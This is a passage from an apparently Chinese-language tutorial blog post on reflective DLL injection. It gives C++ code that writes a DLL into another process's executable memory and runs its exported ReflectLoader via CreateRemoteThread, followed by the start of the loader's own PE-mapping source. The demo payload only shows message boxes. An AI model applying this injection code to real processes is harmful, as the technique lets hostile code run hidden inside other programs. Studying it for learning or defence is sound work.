class="line"><span class="built_in">ZeroMemory</span>(pBuf, FileSize);</span><br><span class="line"><span class="type">int</span> result = <span class="built_in">ReadFile</span>(hFile, pBuf, FileSize, SizeToRead, <span class="literal">NULL</span>);  <span class="comment">//读取文件放在开辟的空间里，pBuf为空间句柄 </span></span><br><span class="line"><span class="keyword">if</span> (result == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n[-] 文件读取失败&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//对接下来开辟的空间进行计算大小</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBuf;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)pBuf + pDos-&gt;e_lfanew);</span><br><span class="line">PIMAGE_SECTION_HEADER pSection = (PIMAGE_SECTION_HEADER)((LPBYTE)pNt + <span class="built_in">sizeof</span>(IMAGE_NT_HEADERS));</span><br><span class="line">DWORD ImageSize = pNt-&gt;OptionalHeader.SizeOfImage;</span><br><span class="line"></span><br><span class="line"><span class="comment">//开辟目标进程中的&quot;类磁盘&quot;空间，大小为前文的FileSize</span></span><br><span class="line"><span class="comment">//这里注意申请的地址权限要是可执行的（PAGE_EXECUTE_READWRITE）</span></span><br><span class="line"><span class="comment">//这里创建的时候一下子创两个</span></span><br><span class="line"><span class="comment">//刚开始没发现，才发现，pAlloc应该+的是FileSize哎呀麻烦了我想想</span></span><br><span class="line">ULONG_PTR TotalSize = ImageSize + ImageSize;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n[+] FileSize : %p&quot;</span>, FileSize);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n[+] ImageSize: %p&quot;</span>, ImageSize);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n[+] TotalSize: %p&quot;</span>, TotalSize);</span><br><span class="line"><span class="comment">//这里遇到一个问题是，传入的TotaSize大小不够后面节区表的第一个表，好奇怪所以需要修正TotalSize大小</span></span><br><span class="line">LPVOID pDll = <span class="built_in">VirtualAllocEx</span>(hProc, <span class="literal">NULL</span>, TotalSize + <span class="number">1</span>, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (pDll == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n[-] 内存分配失败, 错误代码: %d&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 清零目标进程内存</span></span><br><span class="line">SIZE_T sizeToZero = TotalSize; <span class="comment">// 需要清零的字节数</span></span><br><span class="line">BYTE* zeroBuffer = (BYTE*)<span class="built_in">calloc</span>(sizeToZero, <span class="number">1</span>); <span class="comment">// 创建一个全零的缓冲区</span></span><br><span class="line"><span class="keyword">if</span> (zeroBuffer == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Failed to allocate zero buffer.\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 写入全零到目标内存</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">WriteProcessMemory</span>(hProc, pDll, zeroBuffer, sizeToZero, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">DWORD errorCode = <span class="built_in">GetLastError</span>();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;WriteProcessMemory failed with error code: %lu\n&quot;</span>, errorCode);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 释放缓冲区</span></span><br><span class="line"><span class="built_in">free</span>(zeroBuffer);</span><br><span class="line"></span><br><span class="line"><span class="comment">//将dll文件写入进去</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">WriteProcessMemory</span>(hProc, pDll, pBuf, FileSize, <span class="literal">NULL</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//接下来的活是找dll文件中相当于loadlibrary函数的自写函数Reflectload</span></span><br><span class="line"><span class="comment">//注意前文开辟的&quot;类磁盘&quot;空间中的pDll</span></span><br><span class="line"><span class="comment">// 假设 ReflectLoader 是目标函数名</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* reflectFuncName = <span class="string">&quot;ReflectLoader&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取 ReflectLoader 在目标进程内存中的地址</span></span><br><span class="line">LPVOID pReflectLoader = <span class="built_in">GetRemoteReflectLoad</span>(pDll, reflectFuncName, pBuf);</span><br><span class="line"><span class="keyword">if</span> (!pReflectLoader) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to find ReflectLoader.\n&quot;</span>);</span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProc, pDll, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LPVOID pAlloc = (LPVOID)((ULONG_PTR)pDll + ImageSize);</span><br><span class="line">PIMAGE_SECTION_HEADER pSec = (PIMAGE_SECTION_HEADER)((ULONG_PTR)pAlloc + pDos-&gt;e_lfanew + <span class="built_in">sizeof</span>(IMAGE_NT_HEADERS));</span><br><span class="line">PIMAGE_SECTION_HEADER pSect = (PIMAGE_SECTION_HEADER)((ULONG_PTR)pDll + pDos-&gt;e_lfanew + <span class="built_in">sizeof</span>(IMAGE_NT_HEADERS));</span><br><span class="line">PIMAGE_BASE_RELOCATION pBaseReloc = (PIMAGE_BASE_RELOCATION)((ULONG_PTR)pNt-&gt;OptionalHeader.DataDirectory[<span class="number">5</span>].VirtualAddress + (ULONG_PTR)pAlloc);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n[+] Dll磁盘起始地址:%p&quot;</span>, pDll);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n[+] Dll磁盘终止地址:%p&quot;</span>, (ULONG_PTR)pDll + FileSize);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n[+] Dll内存起始地址:%p&quot;</span>, pAlloc);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n[+] Dll整体结束地址:%p&quot;</span>, (ULONG_PTR)pAlloc + ImageSize);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n[+] 磁盘中Nt表头地址:%p&quot;</span>, (ULONG_PTR)pDll + pDos-&gt;e_lfanew);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n[+] 内存中Nt表头地址:%p&quot;</span>, (ULONG_PTR)pAlloc + pDos-&gt;e_lfanew);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n[+] 磁盘中Sec表头地址:%p&quot;</span>, pSect);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n[+] 内存中Sec表头地址:%p&quot;</span>, pSec);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n[+] 重定位表基址:%p&quot;</span>, pBaseReloc);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n[+] 重定位表RVA:%p&quot;</span>, (ULONG_PTR)pNt-&gt;OptionalHeader.DataDirectory[<span class="number">5</span>].VirtualAddress);</span><br><span class="line">DWORD Relco = <span class="built_in">RVAtoFileOffset</span>((DWORD)pNt-&gt;OptionalHeader.DataDirectory[<span class="number">5</span>].VirtualAddress, pNt, pSection);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n[+] 重定位表文件偏移:%p&quot;</span>, (ULONG_PTR)pDll + Relco);</span><br><span class="line"></span><br><span class="line"><span class="comment">//DWORD SecNum = pNt-&gt;FileHeader.NumberOfSections;</span></span><br><span class="line"><span class="comment">//for (int i = 0; i &lt; SecNum; i++) &#123;</span></span><br><span class="line"><span class="comment">//if (pSection-&gt;SizeOfRawData == 0 || pSection-&gt;PointerToRawData == 0) &#123;</span></span><br><span class="line"><span class="comment">//pSection++;</span></span><br><span class="line"><span class="comment">//continue;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//char* chSrcMem = (char*)((ULONG_PTR)pDll + (DWORD)(pSection-&gt;PointerToRawData));</span></span><br><span class="line"><span class="comment">//char* chDestMem = (char*)((ULONG_PTR)pAlloc + (DWORD)(pSection-&gt;PointerToRawData));</span></span><br><span class="line"><span class="comment">//printf(&quot;\n[+] 磁盘中第%d个节区表对应文件地址:%p&quot;,i, chSrcMem);</span></span><br><span class="line"><span class="comment">//printf(&quot;\n[+] 内存中第%d个节区表对应文件地址:%p&quot;,i, chDestMem);</span></span><br><span class="line"><span class="comment">//pSection++;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n[+] 函数 address:%p&quot;</span>, pReflectLoader);</span><br><span class="line"><span class="comment">// 调用 ReflectLoader 函数</span></span><br><span class="line">HANDLE hThread = <span class="built_in">CreateRemoteThread</span>(</span><br><span class="line">hProc,                       <span class="comment">// 目标进程句柄</span></span><br><span class="line"><span class="literal">NULL</span>,                        <span class="comment">// 默认安全属性</span></span><br><span class="line"><span class="number">0</span>,                           <span class="comment">// 默认堆栈大小</span></span><br><span class="line">(LPTHREAD_START_ROUTINE)pReflectLoader, <span class="comment">// ReflectLoader 地址</span></span><br><span class="line">pDll,                        <span class="comment">// 参数：DLL 的基址</span></span><br><span class="line"><span class="number">0</span>,                           <span class="comment">// 默认创建标志</span></span><br><span class="line"><span class="literal">NULL</span>                         <span class="comment">// 不需要线程 ID</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!hThread) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n[-] CreateRemoteThread failed: %d&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProc, pDll, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n[+] ReflectLoader executed successfully.&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等待线程执行完成</span></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ReflectLoader"><a href="#ReflectLoader" class="headerlink" title="ReflectLoader"></a>ReflectLoader</h2><p>我将一个文件的展开过程分为两部分，一部分是映射文件头和节区段，另一部分是修复重定位表和导入表</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winternl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function">BOOL <span class="title">ReflectLoader</span><span class="params">(<span class="type">char</span>* pDll)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">CompareDllName</span><span class="params">(<span class="type">wchar_t</span>* dllName, <span class="type">wchar_t</span>* targetDllName)</span></span>;</span><br><span class="line"><span class="function"><span class="type">wchar_t</span>* <span class="title">ExtractDllName</span><span class="params">(<span class="type">const</span> <span class="type">wchar_t</span>* fullDllName)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">my_wctomb</span><span class="params">(<span class="type">char</span>* dest, <span class="type">const</span> <span class="type">wchar_t</span>* src)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">CompareStrings</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str1, <span class="type">const</span> <span class="type">char</span>* str2)</span></span>;</span><br><span class="line"><span class="comment">// DLL入口点函数</span></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 弹窗代码</span></span><br><span class="line">    <span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, <span class="string">L&quot;哇塞！！你成功啦！！！&quot;</span>, <span class="string">L&quot;注入程序检测中...&quot;</span>, MB_YESNO | MB_ICONASTERISK);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> processName[MAX_PATH] = &#123; <span class="number">0</span> &#125;; <span class="comment">// 存储进程路径的缓冲区</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取当前进程的可执行文件路径</span></span><br><span class="line">    DWORD length = <span class="built_in">GetModuleFileNameA</span>(<span class="literal">NULL</span>, processName, MAX_PATH);</span><br><span class="line">    <span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, processName, <span class="string">&quot;当前进程路径: &quot;</span>, MB_YESNO | MB_ICONASTERISK);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">99999999</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 自定义的宽字符转普通字符的函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">my_wctomb</span><span class="params">(<span class="type">char</span>* dest, <span class="type">const</span> <span class="type">wchar_t</span>* src)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (*src) &#123;</span><br><span class="line">        <span class="keyword">if</span> (*src &gt;= <span class="string">L&#x27;A&#x27;</span> &amp;&amp; *src &lt;= <span class="string">L&#x27;Z&#x27;</span>) &#123;</span><br><span class="line">            *dest = (<span class="type">char</span>)(*src + (<span class="string">L&#x27;a&#x27;</span> - <span class="string">L&#x27;A&#x27;</span>));  <span class="comment">// 转换大写字符为小写</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (*src &gt;= <span class="string">L&#x27;a&#x27;</span> &amp;&amp; *src &lt;= <span class="string">L&#x27;z&#x27;</span>) &#123;</span><br><span class="line">            *dest = (<span class="type">char</span>)*src;  <span class="comment">// 保留小写字符</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (*src &gt;= <span class="string">L&#x27;0&#x27;</span> &amp;&amp; *src &lt;= <span class="string">L&#x27;9&#x27;</span>) &#123;</span><br><span class="line">            *dest = (<span class="type">char</span>)*src;  <span class="comment">// 保留数字字符</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            *dest = <span class="string">&#x27;?&#x27;</span>;  <span class="comment">// 对于其他字符，可以选择替代字符，例如 &#x27;？&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        dest++;</span><br><span class="line">        src++;</span><br><span class="line">    &#125;</span><br><span class="line">    *dest = <span class="string">&#x27;\0&#x27;</span>;  <span class="comment">// 确保目标字符串以 null 结尾</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">CompareStrings</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str1, <span class="type">const</span> <span class="type">char</span>* str2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (*str2 != <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (*str1 != *str2) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 返回差值</span></span><br><span class="line">        &#125;</span><br><span class="line">        str1++;</span><br><span class="line">        str2++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">// 两个字符串完全匹配时返回0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 比较两个 DLL 名称（大小写不敏感）</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">CompareDllName</span><span class="params">(<span class="type">wchar_t</span>* dllName, <span class="type">wchar_t</span>* targetDllName)</span> </span>&#123;</span><br><span class="line">    <span class="type">size_t</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (dllName[i] != <span class="string">L&#x27;\0&#x27;</span> || targetDllName[i] != <span class="string">L&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">        <span class="comment">// 将两个字符都转换为小写进行比较</span></span><br><span class="line">        <span class="type">wchar_t</span> ch1 = (dllName[i] &gt;= <span class="string">L&#x27;A&#x27;</span> &amp;&amp; dllName[i] &lt;= <span class="string">L&#x27;Z&#x27;</span>) ? dllName[i] + (<span class="string">L&#x27;a&#x27;</span> - <span class="string">L&#x27;A&#x27;</span>) : dllName[i];</span><br><span class="line">        <span class="type">wchar_t</span> ch2 = (targetDllName[i] &gt;= <span class="string">L&#x27;A&#x27;</span> &amp;&amp; targetDllName[i] &lt;= <span class="string">L&#x27;Z&#x27;</span>) ? targetDllName[i] + (<span class="string">L&#x27;a&#x27;</span> - <span class="string">L&#x27;A&#x27;</span>) : targetDllName[i];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果字符不同，则返回比较结果</span></span><br><span class="line">        <span class="keyword">if</span> (ch1 != ch2) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果字符串都没有结束且匹配到最后，返回 0 表示完全相等</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;  <span class="comment">// 如果两个字符串完全相同，返回 0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 提取 DLL 名称的函数</span></span><br><span class="line"><span class="function"><span class="type">wchar_t</span>* <span class="title">ExtractDllName</span><span class="params">(<span class="type">const</span> <span class="type">wchar_t</span>* fullDllName)</span> </span>&#123;</span><br><span class="line">    <span class="type">wchar_t</span>* fileName = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">wchar_t</span>* temp = (<span class="type">wchar_t</span>*)fullDllName;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历并找到最后一个 &#x27;\\&#x27;，获取文件名部分</span></span><br><span class="line">    <span class="keyword">while</span> (*temp) &#123;</span><br><span class="line">        <span class="keyword">if</span> (*temp == <span class="string">L&#x27;\\&#x27;</span>) &#123;</span><br><span class="line">            fileName = temp + <span class="number">1</span>;  <span class="comment">// 更新文件名的位置</span></span><br><span class="line">        &#125;</span><br><span class="line">        temp++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果没有找到 &#x27;\\&#x27;，则认为整个字符串就是文件名</span></span><br><span class="line">    <span class="keyword">if</span> (!fileName) &#123;</span><br><span class="line">        fileName = (<span class="type">wchar_t</span>*)fullDllName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> fileName;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function">BOOL <span class="title">ReflectLoader</span><span class="params">(<span class="type">char</span>* pDll)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//获取磁盘文件的DOS头和NT头</span></span><br><span class="line">    PIMAGE_DOS_HEADER pDOSheader = (PIMAGE_DOS_HEADER)pDll;                             <span class="comment">//赋值DOS头</span></span><br><span class="line">    PIMAGE_NT_HEADERS pNTheader = (PIMAGE_NT_HEADERS)(pDll + pDOSheader-&gt;e_lfanew); <span class="comment">//赋值NT头</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//给内存分配空间，并对pAlloc进行初始化</span></span><br><span class="line">    DWORD ImageSize = pNTheader-&gt;OptionalHeader.SizeOfImage;  <span class="comment">//内存空间大小</span></span><br><span class="line">    PBYTE pAlloc = (PBYTE)((ULONG_PTR)pDll + ImageSize);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pAlloc == <span class="literal">NULL</span>) <span class="keyword">return</span> FALSE;</span><br><span class="line">    <span class="keyword">if</span> (pDOSheader-&gt;e_magic != IMAGE_DOS_SIGNATURE || pNTheader-&gt;Signature != IMAGE_NT_SIGNATURE) <span class="keyword">return</span> FALSE;  <span class="comment">// 无效的头，直接退出</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 手动实现 CopyMemory 的功能</span></span><br><span class="line">    BYTE* dst = (BYTE*)pAlloc;               <span class="comment">// 目标内存地址</span></span><br><span class="line">    BYTE* src = (BYTE*)pDll;                 <span class="comment">// 源内存地址</span></span><br><span class="line">    <span class="type">size_t</span> size = pNTheader-&gt;OptionalHeader.SizeOfHeaders; <span class="comment">// 需要复制的字节数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; size; ++i) &#123;</span><br><span 